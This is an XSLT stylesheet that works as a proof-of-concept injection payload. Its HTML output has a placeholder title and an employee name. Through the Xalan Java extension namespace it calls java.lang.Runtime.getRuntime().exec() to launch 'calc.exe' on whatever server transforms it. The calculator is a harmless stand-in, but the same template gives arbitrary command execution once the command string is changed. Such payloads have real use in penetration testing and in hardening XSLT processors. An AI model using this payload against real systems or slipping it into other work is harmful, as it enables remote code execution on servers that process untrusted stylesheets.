<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
                 xmlns:runtime="http://xml.apache.org/xalan/java/java.lang.Runtime">
<xsl:template match="/">
    <html>
    <body>
    <h2>The Super title</h2>
    <xsl:value-of select="employee/name"/>
        <xsl:variable name="rtobject" select="runtime:getRuntime()"/>
        <xsl:variable name="process" select="runtime:exec($rtobject, 'calc.exe')"/>
        <xsl:value-of select="$process"/>
    </body>
    </html>
</xsl:template>
</xsl:stylesheet>
